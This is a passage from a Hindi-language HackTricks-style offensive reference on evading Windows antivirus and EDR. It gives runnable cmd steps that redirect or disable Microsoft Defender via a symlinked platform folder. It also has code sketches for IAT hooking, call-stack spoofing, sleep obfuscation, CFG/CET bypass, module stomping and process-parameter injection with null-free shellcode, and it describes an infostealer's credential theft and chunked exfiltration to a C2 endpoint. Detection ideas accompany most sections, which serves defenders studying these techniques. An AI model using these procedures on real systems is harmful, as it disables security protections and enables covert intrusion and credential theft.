- WDAC/Code Integrity: यह restrict करें कि कौन-से signed binaries PPL के रूप में और किन parents के अंतर्गत run कर सकते हैं; legitimate contexts के बाहर ClipUp invocation को block करें।
- Service hygiene: auto-start services के creation/modification को restrict करें और start-order manipulation को monitor करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections enabled हों; binary corruption का संकेत देने वाली startup errors की जाँच करें।
- यदि आपके environment के साथ compatible हो, तो security tooling होस्ट करने वाले volumes पर 8.3 short-name generation को disable करने पर विचार करें (पूरी तरह test करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack के माध्यम से Microsoft Defender से Tampering

Windows Defender उस platform का चयन करता है जिससे वह निम्नलिखित स्थान के अंतर्गत subfolders को enumerate करके run होता है:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह highest lexicographic version string वाले subfolder का चयन करता है (जैसे, `4.18.25070.5-0`), फिर वहीं से Defender service processes start करता है (service/registry paths को उसी के अनुसार update करते हुए)। यह selection directory entries, जिनमें directory reparse points (symlinks) भी शामिल हैं, पर trust करता है। एक administrator इसका उपयोग Defender को attacker-writable path पर redirect करने और DLL sideloading या service disruption प्राप्त करने के लिए कर सकता है।

Preconditions
- Local Administrator (Platform folder के अंतर्गत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform re-selection trigger करने की ability (boot पर service restart)
- केवल built-in tools आवश्यक हैं (`mklink`)

Why it works
- Defender अपने folders में writes को block करता है, लेकिन इसका platform selection directory entries पर trust करता है और यह validate किए बिना lexicographically highest version चुनता है कि target किसी protected/trusted path पर resolve होता है या नहीं।

Step-by-step (example)
1) Current platform folder का एक writable clone तैयार करें, जैसे `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) अपने फ़ोल्डर की ओर संकेत करने वाला Platform के अंदर एक higher-version directory symlink बनाएं:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger का चयन (reboot recommended):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) redirected path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के अंतर्गत नया process path और उस location को दर्शाने वाला service configuration/registry दिखाई देना चाहिए।

Post-exploitation विकल्प
- DLL sideloading/code execution: उन DLLs को drop/replace करें जिन्हें Defender अपनी application directory से load करता है, ताकि Defender के processes में code execute किया जा सके। ऊपर दिया गया section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying)।
- Service kill/denial: version-symlink को remove करें, ताकि अगली start पर configured path resolve न हो और Defender start होने में fail हो जाए:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> ध्यान दें कि यह technique अपने-आप privilege escalation प्रदान नहीं करती; इसके लिए admin rights आवश्यक हैं।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से निकालकर target module के अंदर ले जा सकते हैं। इसके लिए वे उसके Import Address Table (IAT) को hook करते हैं और चुने गए APIs को attacker-controlled, position-independent code (PIC) के माध्यम से route करते हैं। इससे evasion उन छोटे API surface से आगे सामान्यीकृत हो जाता है जिन्हें कई kits expose करते हैं (जैसे, CreateProcessA), और यही protections BOFs तथा post-exploitation DLLs तक भी विस्तारित हो जाती हैं।

उच्च-स्तरीय तरीका
- Reflective loader (prepended या companion) का उपयोग करके target module के साथ एक PIC blob stage करें। PIC self-contained और position-independent होना चाहिए।
- Host DLL load होते समय उसके IMAGE_IMPORT_DESCRIPTOR को walk करें और targeted imports (जैसे, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) की IAT entries को thin PIC wrappers की ओर point करने के लिए patch करें।
- प्रत्येक PIC wrapper real API address को tail-call करने से पहले evasions execute करता है। सामान्य evasions में शामिल हैं:
- Call के आसपास memory mask/unmask (जैसे, beacon regions को encrypt करना, RWX→RX करना, page names/permissions बदलना), फिर call के बाद उन्हें restore करना।
- Call-stack spoofing: एक benign stack तैयार करें और target API में transition करें, ताकि call-stack analysis expected frames तक resolve हो।
- Compatibility के लिए एक interface export करें, ताकि कोई Aggressor script (या equivalent) Beacon, BOFs और post-ex DLLs के लिए hook किए जाने वाले APIs register कर सके।

यहाँ IAT hooking क्यों
- यह उस प्रत्येक code के लिए काम करता है जो hooked import का उपयोग करता है, tool code को modify करने या specific APIs को proxy करने के लिए Beacon पर निर्भर रहने की आवश्यकता नहीं होती।
- Post-ex DLLs को cover करता है: LoadLibrary* को hooking करने से आप module loads (जैसे, System.Management.Automation.dll, clr.dll) intercept कर सकते हैं और उनके API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके call-stack–based detections के विरुद्ध process-spawning post-ex commands का reliable उपयोग फिर से सक्षम करता है।

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR के बाद और import के first use से पहले patch लागू करें। TitanLdr/AceLdr जैसे Reflective loaders loaded module के DllMain के दौरान hooking प्रदर्शित करते हैं।
- Wrappers को छोटा और PIC-safe रखें; patching से पहले capture किए गए original IAT value के माध्यम से या LdrGetProcedureAddress के जरिए वास्तविक API resolve करें।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable pages न छोड़ें।

Call‑stack spoofing stub
- Draugr‑style PIC stubs एक fake call chain बनाते हैं (benign modules के अंदर return addresses) और फिर real API में pivot करते हैं।
- इससे वे detections विफल हो जाते हैं जो Beacon/BOFs से sensitive APIs तक canonical stacks की अपेक्षा करते हैं।
- API prologue से पहले expected frames के अंदर पहुंचने के लिए इसे stack cutting/stack stitching techniques के साथ जोड़ें।

Operational integration
- Reflective loader को post‑ex DLLs के आगे रखें, ताकि DLL load होने पर PIC और hooks अपने-आप initialise हो जाएं।
- Target APIs register करने के लिए Aggressor script का उपयोग करें, ताकि Beacon और BOFs code changes के बिना उसी evasion path से transparently लाभ उठा सकें।

Detection/DFIR considerations
- IAT integrity: वे entries जो non-image (heap/anon) addresses पर resolve होती हैं; import pointers का periodic verification।
- Stack anomalies: ऐसे return addresses जो loaded images से संबंधित नहीं हैं; non-image PIC में abrupt transitions; असंगत RtlUserThreadStart ancestry।
- Loader telemetry: IAT में in-process writes, import thunks को modify करने वाली early DllMain activity, load के समय बनाए गए unexpected RX regions।
- Image-load evasion: यदि LoadLibrary* को hook किया गया है, तो memory masking events के साथ correlated automation/clr assemblies के suspicious loads को monitor करें।

Related building blocks and examples
- ऐसे Reflective loaders जो load के दौरान IAT patching करते हैं (जैसे, TitanLdr, AceLdr)
- Memory masking hooks (जैसे, simplehook) और stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (जैसे, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

यदि आप किसी Reflective loader को control करते हैं, तो custom resolver के साथ loader के `GetProcAddress` pointer को बदलकर `ProcessImports()` के दौरान **import hooks** कर सकते हैं, जो पहले hooks को check करता है:

- एक **resident PICO** (persistent PIC object) बनाएं, जो transient loader PIC के स्वयं free होने के बाद भी बना रहे।
- एक `setup_hooks()` function export करें, जो loader के import resolver को overwrite करे (जैसे, `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में ordinal imports को skip करें और `__resolve_hook(ror13hash(name))` जैसा hash-based hook lookup उपयोग करें। यदि hook मौजूद है, तो उसे return करें; अन्यथा वास्तविक `GetProcAddress` को delegate करें।
- Crystal Palace में link time पर `addhook "MODULE$Func" "hook"` entries के साथ hook targets register करें। Hook valid रहता है क्योंकि वह resident PICO के अंदर रहता है।

इससे loaded DLL के code section को post-load patch किए बिना **import-time IAT redirection** प्राप्त होती है।

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks तभी trigger होते हैं जब function वास्तव में target के IAT में मौजूद हो। यदि कोई module PEB-walk + hash के माध्यम से APIs resolve करता है (कोई import entry नहीं), तो वास्तविक import force करें ताकि loader का `ProcessImports()` path उसे देख सके:

- Hashed export resolution (जैसे, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को `&WaitForSingleObject` जैसे direct reference से replace करें।
- Compiler एक IAT entry emit करेगा, जिससे Reflective loader द्वारा imports resolve किए जाने पर interception सक्षम होगी।

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep` को patch करने के बजाय implant द्वारा उपयोग किए जाने वाले **वास्तविक wait/IPC primitives** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) को hook करें। Long waits के लिए call को Ekko-style obfuscation chain में wrap करें, जो idle के दौरान in-memory image को encrypt करती है:

- Callbacks का sequence schedule करने के लिए `CreateTimerQueueTimer` का उपयोग करें, जो crafted `CONTEXT` frames के साथ `NtContinue` call करते हैं।
- Typical chain (x64): image को `PAGE_READWRITE` पर set करें → full mapped image पर `advapi32!SystemFunction032` के माध्यम से RC4 encrypt करें → blocking wait करें → RC4 decrypt करें → PE sections को walk करके **per-section permissions restore करें** → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` प्रदान करता है; उसे multiple frames में clone करें और प्रत्येक step invoke करने के लिए registers (`Rip/Rcx/Rdx/R8/R9`) set करें।

Operational detail: long waits के लिए “success” return करें (जैसे, `WAIT_OBJECT_0`), ताकि image masked रहते हुए caller आगे बढ़े। यह pattern idle windows के दौरान module को scanners से छिपाता है और classic “patched `Sleep()`” signature से बचता है।

Detection ideas (telemetry-based)
- `NtContinue` की ओर point करने वाले `CreateTimerQueueTimer` callbacks के bursts।
- Large contiguous image-sized buffers पर `advapi32!SystemFunction032` का उपयोग।
- Large-range `VirtualProtect`, जिसके बाद custom per-section permission restoration हो।

### Runtime CFG registration for sleep-obfuscation gadgets

CFG-enabled targets पर `jmp [rbx]` या `jmp rdi` जैसे mid-function gadget में पहला indirect jump आमतौर पर process को `STATUS_STACK_BUFFER_OVERRUN` के साथ crash कर देगा, क्योंकि gadget module के CFG metadata में मौजूद नहीं होता। Hardened processes के अंदर Ekko/Kraken-style chains को alive रखने के लिए:

- Chain द्वारा उपयोग किए जाने वाले प्रत्येक indirect destination को `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` और `CFG_CALL_TARGET_VALID` entries के साथ register करें।
- Loaded images (`ntdll`, `kernel32`, `advapi32`) के अंदर मौजूद addresses के लिए `MEMORY_RANGE_ENTRY` को **image base** से start होना चाहिए और **full image size** को cover करना चाहिए।
- Manually mapped/PIC/stomped regions के लिए इसके बजाय **allocation base** और allocation size का उपयोग करें।
- केवल dispatch gadget को नहीं, बल्कि indirectly reached exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) और उन सभी attacker-controlled executable sections को भी mark करें जो indirect targets बनेंगे।

इससे ROP/JOP-style sleep chains “केवल non-CFG processes में काम करती हैं” से बदलकर `explorer.exe`, browsers, `svchost.exe` और `/guard:cf` के साथ compiled अन्य endpoints के लिए reusable primitive बन जाती हैं।

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement noisy हो सकता है और CET Shadow Stack systems पर fail हो सकता है, क्योंकि spoofed `Rip` को hardware shadow stack के साथ agree करना आवश्यक है। एक safer sleep-masking pattern है:

- उसी process में किसी अन्य thread को चुनें और `NtQueryInformationThread` के माध्यम से उसके `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) पढ़ें।
- Current thread के वास्तविक TEB/TIB का backup लें।
- `GetThreadContext` के साथ वास्तविक sleeping context capture करें।
- वास्तविक `Rip` को spoof context में **केवल copy करें**, और spoofed `Rsp`/stack state को intact छोड़ें।
- Sleep window के दौरान spoof thread के `NT_TIB` को current TEB में copy करें, ताकि stack walkers legitimate stack range के अंदर unwind करें।
- Wait समाप्त होने के बाद original TIB और thread context restore करें।

यह CET-consistent instruction pointer को बनाए रखता है, जबकि उन EDR stack walkers को mislead करता है जो unwinds validate करने के लिए TEB stack metadata पर भरोसा करते हैं।

### APC-based alternative: Kraken Mask

यदि timer-queue dispatch बहुत अधिक signatured है, तो यही sleep-encrypt-spoof-restore sequence queued APCs का उपयोग करने वाले suspended helper thread से execute की जा सकती है:

- Entry point के रूप में `NtTestAlert` के साथ एक helper thread बनाएं।
- `NtQueueApcThread` के साथ prepared `CONTEXT` frames/APCs queue करें और `NtAlertResumeThread` के साथ उन्हें drain करें।
- Default 64 KB thread stack को exhaust करने से बचने के लिए chain state को helper stack के बजाय heap पर store करें।
- Start event को atomically signal करने और block करने के लिए `NtSignalAndWaitForSingleObject` का उपयोग करें।
- TIB/context restore करने से पहले main thread को suspend करें (`NtSuspendThread` → restore → `NtResumeThread`), ताकि scanner द्वारा half-restored stack पकड़े जाने वाली race window कम हो।

यह समान RC4 masking और stack-spoofing goals बनाए रखते हुए `CreateTimerQueueTimer` + `NtContinue` signature को helper-thread/APC signature से बदल देता है।

Additional detection ideas
- Sleeps, waits या APC dispatch से ठीक पहले `VmCfgCallTargetInformation` के साथ `NtSetInformationVirtualMemory`।
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` या `ConnectNamedPipe` के आसपास wrapped `GetThreadContext`/`SetThreadContext`।
- `NtQueryInformationThread`, जिसके बाद current thread के TEB/TIB stack bounds में direct writes हों।
- `NtQueueApcThread`/`NtAlertResumeThread` chains, जो indirectly `SystemFunction032`, `VirtualProtect` या section-permission restoration helpers तक पहुंचती हों।
- Signed modules के अंदर dispatch pivots के रूप में `FF 23` (`jmp [rbx]`) या `FF E7` (`jmp rdi`) जैसे short gadget signatures का repeated उपयोग।


## Precision Module Stomping

Module stomping target process के अंदर पहले से mapped DLL के **`.text` section से payloads execute** करता है, बजाय obvious private executable memory allocate करने या नई sacrificial DLL load करने के। Overwrite target एक **loaded, disk-backed image** होना चाहिए, जिसका code space process द्वारा अभी आवश्यक code paths को corrupt किए बिना payload को absorb कर सके।

### Reliable target selection

`uxtheme.dll` या `comctl32.dll` जैसे common modules के विरुद्ध naive stomping fragile होता है: DLL remote process में loaded न हो सकती है, और बहुत छोटा code region process को crash कर देगा। अधिक reliable workflow:

1. Target process modules enumerate करें और पहले से loaded DLLs की **names-only include list** रखें।
2. पहले payload build करें और उसका **exact byte size** record करें।
3. Candidate DLLs को disk पर scan करें और PE section **`.text` `Misc_VirtualSize`** की payload size के साथ तुलना करें। यह file size से अधिक महत्वपूर्ण है, क्योंकि यह executable section के **memory में mapped होने पर आकार** को दर्शाता है।
4. **Export Address Table (EAT)** parse करें और stomp start offset के रूप में किसी exported function RVA को चुनें।
5. **Blast radius** calculate करें: यदि payload selected function boundary से आगे निकलता है, तो memory में उसके बाद रखे गए adjacent exports overwrite हो जाएंगे।

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Remote process में **already loaded** DLLs को प्राथमिकता दें, ताकि `LoadLibrary`/unexpected image loads की telemetry से बचा जा सके।
- ऐसे exports को प्राथमिकता दें जिन्हें target application बहुत कम execute करता हो; अन्यथा सामान्य code paths thread creation से पहले या बाद में stomped bytes तक पहुँच सकते हैं।
- बड़े implants के लिए अक्सर shellcode embedding को string literal से **byte-array/braced initializer** में बदलना आवश्यक होता है, ताकि injector source में पूरा buffer सही रूप से represent हो।

Detection ideas
- सामान्य private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में remote writes।
- ऐसे export entry points जिनके in-memory bytes अब disk पर मौजूद backing file से match नहीं करते।
- ऐसे remote threads या context pivots जो किसी legitimate DLL export के भीतर execution शुरू करते हैं, जिसके पहले bytes हाल ही में modify किए गए हों।
- DLL `.text` pages पर thread creation के बाद होने वाले संदिग्ध `VirtualProtect(Ex)` / `WriteProcessMemory` sequences।

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) एक **process-injection / EDR-evasion** technique है, जो classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`) से बचती है। पहले से चल रहे target में bytes copy करने के बजाय, यह इस तथ्य का दुरुपयोग करती है कि Windows चयनित `CreateProcessW` startup parameters को child process में **copy करता है** और उन्हें `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) के अंदर store करता है।

### Poisonable carriers copied by `CreateProcessW`

उपयोगी carriers हैं:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (with `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Practical carrier constraints:

- `lpCommandLine` को `CreateProcessW` के लिए **writable memory** की ओर point करना चाहिए, और यह null terminator सहित अधिकतम **32,767 Unicode characters** तक सीमित है।
- `lpEnvironment` लगातार `NAME=VALUE\0` strings वाला Unicode environment block होना चाहिए, जिसके अंत में एक अतिरिक्त `\0` हो।
- `lpReserved` आधिकारिक रूप से reserved है, इसलिए `ShellInfo` mapping को स्थिर documented contract के बजाय implementation detail माना जाना चाहिए।

इससे सामान्य process creation **payload-transfer primitive** में बदल जाती है। Operator attacker-controlled startup data के साथ child process बनाता है और Windows को cross-process copy करने देता है।

### Remote lookup flow without remote write APIs

Child बनने के बाद, copied buffer को **read-only** primitives से resolve करें:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` प्राप्त करें
2. Remote `PEB` पढ़ें
3. `PEB.ProcessParameters` को follow करें
4. `RTL_USER_PROCESS_PARAMETERS` पढ़ें
5. चुने गए pointer का उपयोग करें:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### कॉपी किए गए parameter buffer को execute करना

कॉपी किया गया parameter region आमतौर पर `RW` होता है, executable नहीं। एक सामान्य P3 chain है:

1. Process को सामान्य तरीके से create करें (suspended नहीं)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` से चुने गए parameter page को executable बनाएं
3. `PROCESS_INFORMATION` में पहले से लौटाए गए main thread handle का दोबारा उपयोग करें
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` को overwrite करके) execution को redirect करें

Classic thread hijacking workflows के विपरीत, इसमें `SuspendThread` / `ResumeThread` की आवश्यकता **नहीं होती**; लौटाए गए main thread handle पर सीधे context बदला जा सकता है।

इससे injection के लिए आमतौर पर monitor की जाने वाली कई APIs से बचा जा सकता है:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- अक्सर `SuspendThread` / `ResumeThread` भी

### Null-byte limitation और staged shellcode

तीनों carriers **string या string-like data** होते हैं, इसलिए `0x00` वाला raw payload transfer के दौरान truncate हो जाता है। एक व्यावहारिक workaround एक **null-free first stage** है, जो runtime पर constants को reconstruct करता है और फिर arbitrary second stage को load करता है।

एक सरल pattern XOR-based constant synthesis है:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
यह first stage को transported parameter में null bytes embed किए बिना stack strings, API arguments, DLL paths या second-stage shellcode loader बनाने देता है।

### First stage से stack-based API calls

जब first stage को `LoadLibraryA` जैसे APIs call करने हों, तो यह:

- target stack पर string/buffer push कर सकता है
- **32-byte x64 shadow space** reserve कर सकता है
- `RCX`, `RDX`, `R8`, `R9` को constants या `RSP`-relative pointers पर set कर सकता है
- call से पहले `RSP` को **16-byte aligned** रख सकता है

इसके बाद second stage को stack से `PAGE_READWRITE` allocation में copy किया जा सकता है, `VirtualProtect` के साथ उसे `PAGE_EXECUTE_READ` में बदला जा सकता है और उस पर jump किया जा सकता है, जिससे direct RWX allocation से बचा जा सकता है।

### Detection ideas

Authors द्वारा बताए गए अच्छे hunting opportunities:

- `VirtualProtectEx` / `NtProtectVirtualMemory` द्वारा **process-parameter pages को executable** बनाना
- उस protection change के बाद `SetThreadContext` / `NtSetContextThread` का उपयोग
- `PEB` और उसके बाद `RTL_USER_PROCESS_PARAMETERS` को remote reads द्वारा पढ़ना
- process creation के दौरान असामान्य रूप से लंबे / high-entropy `lpCommandLine`, `lpEnvironment` या `STARTUPINFO.lpReserved` values

### Notes

- P3 एक **cross-process transfer trick** है, अपने-आप में full execution primitive नहीं: copied parameter को अभी भी execute-permission change और execution redirection method की आवश्यकता होती है।
- `RtlCreateProcessReflection` / Dirty Vanity पर authors ने विचार किया था, लेकिन इसे अस्वीकार कर दिया क्योंकि यह internally `NtWriteVirtualMemory` और `NtCreateThreadEx` जैसे suspicious primitives तक पहुंचता है।

## Fileless Evasion और Credential Theft के लिए SantaStealer Tradecraft

SantaStealer (जिसे BluelineStealer भी कहा जाता है) दिखाता है कि modern info-stealers एक ही workflow में AV bypass, anti-analysis और credential access को कैसे मिलाते हैं।

### Keyboard layout gating और sandbox delay

- एक config flag (`anti_cis`) `GetKeyboardLayoutList` के जरिए installed keyboard layouts enumerate करता है। यदि कोई Cyrillic layout मिलता है, तो sample एक empty `CIS` marker drop करके stealers चलाने से पहले terminate हो जाता है। इससे यह excluded locales पर कभी detonate नहीं होता, जबकि hunting artifact छोड़ देता है।
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A process list को traverse करता है, प्रत्येक नाम को custom rolling checksum से hash करता है और debuggers/sandboxes के लिए embedded blocklists से उसकी तुलना करता है; यह computer name पर भी checksum दोहराता है और `C:\analysis` जैसी working directories की जाँच करता है।
- Variant B system properties (process-count floor, recent uptime) का निरीक्षण करता है, VirtualBox additions का पता लगाने के लिए `OpenServiceA("VBoxGuest")` को call करता है और single-stepping का पता लगाने के लिए sleeps के आसपास timing checks करता है। कोई भी hit modules launch होने से पहले प्रक्रिया को abort कर देता है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE में Chromium credential helper embedded होता है, जिसे disk पर drop किया जाता है या memory में manually mapped किया जाता है; fileless mode imports/relocations को स्वयं resolve करता है, इसलिए helper artifacts लिखे नहीं जाते।
- वह helper second-stage DLL को ChaCha20 से दो बार encrypted रूप में store करता है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, वह blob को reflectively load करता है (`LoadLibrary` के बिना) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से derived exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` को call करता है।
- ChromElevator routines direct-syscall reflective process hollowing का उपयोग करके एक live Chromium browser में inject होती हैं, AppBound Encryption keys inherit करती हैं और ABE hardening के बावजूद SQLite databases से सीधे passwords/cookies/credit cards decrypt करती हैं।

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` एक global `memory_generators` function-pointer table को iterate करता है और प्रत्येक enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions आदि) के लिए एक thread spawn करता है। प्रत्येक thread shared buffers में results लिखता है और लगभग 45 सेकंड की join window के बाद अपने file count की report करता है।
- पूरा होने के बाद, statically linked `miniz` library का उपयोग करके सब कुछ `%TEMP%\\Log.zip` के रूप में zip किया जाता है। इसके बाद `ThreadPayload1` 15 सेकंड sleep करता है और archive को HTTP POST के माध्यम से 10 MB chunks में `http://<C2>:6767/upload` पर stream करता है, तथा browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) को spoof करता है। प्रत्येक chunk में `User-Agent: upload`, `auth: <build_id>`, वैकल्पिक `w: <campaign_tag>` जोड़े जाते हैं और अंतिम chunk में `complete: true` append किया जाता है, ताकि C2 को पता चल सके कि reassembly पूरी हो गई है।

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
